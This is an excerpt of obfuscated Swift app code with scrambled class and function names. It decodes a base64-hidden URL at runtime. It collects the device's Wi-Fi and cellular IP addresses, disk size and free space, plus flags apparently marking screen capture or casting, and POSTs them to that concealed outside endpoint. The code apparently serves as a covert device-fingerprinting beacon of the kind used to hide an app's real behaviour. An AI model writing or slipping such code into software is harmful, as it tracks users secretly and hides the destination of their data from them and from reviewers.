...
enum PostEndpoint: SecondEndpoint {
    ...
    case AZEGlfeZXe(myData: sjlHdRhmmB, isCaptured: Bool, isCast: Bool)
    ...
    var mainURL: String {
        ...
        default:
            return jFipDjIpVY("aHR0cHM6Ly93ZXRlcnV0ZXIuc3BhY2UvYXBwL3BybzBvZmZveA==")
        }
    }
    ...
    var body: [String: Any] {
        ...
        case .AZEGlfeZXe(let myData, let isCaptured, let cast):
...
class tLcSEqByMG {
    ...
    func request<T: Codable>(endpoint: SecondEndpoint, completion: @escaping (Result< T, Error>) -> Void) {
        ...
        guard let url = URL(string: jFipDjIpVY(endpoint.mainURL)) else { return }
...
protocol RepositoryProtocolSecond {
    func AZEGlfeZXe(isCaptured: Bool, isCast: Bool, mydata: sjlHdRhmmB, completion: @escaping (Result< Int, Error>) -> Void)
}

class eBrVUtmhbj: RepositoryProtocolSecond {

    private let networkEngine: tLcSEqByMG

    init(networkEngine: tLcSEqByMG = tLcSEqByMG()) {
        self.networkEngine = networkEngine
    }
    
    func AZEGlfeZXe(isCaptured: Bool, isCast: Bool, mydata: sjlHdRhmmB, completion: @escaping (Result< Int, Error>) -> Void) {
        networkEngine.request(endpoint: PostEndpoint.AZEGlfeZXe(myData: mydata, isCaptured: isCaptured, isCast: isCast), completion: completion)
    }
}
...
struct YbpcLrwXev {
    ...
    static func OuZBGzDftb() -> sjlHdRhmmB {
        
        //получить адрес вайфая
        let wifiAdress = jPqqkqRCFZ(for: .wifi)
        let cellularAdress = jPqqkqRCFZ(for: .cellular)
        ...
        let totalSpaceInBytes = liFLNoNQCU.uQlPVOWTeI(for: .systemSize) ?? 0
        let totalSpaceInGB = liFLNoNQCU.xYCrNICmEI(totalSpaceInBytes) ?? "can't get"
        
        let freeSpaceInBytes = liFLNoNQCU.uQlPVOWTeI(for: .systemFreeSize) ?? 0
        let freeSpaceInGB = liFLNoNQCU.xYCrNICmEI(freeSpaceInBytes) ?? "can't get"
...
struct liFLNoNQCU {
    ...
    static func uQlPVOWTeI(for key: FileAttributeKey) -> Int64? {
    ...
    static func xYCrNICmEI(_ bytes: Int64, to units: ByteCountFormatter.Units = .useGB) -> String? {
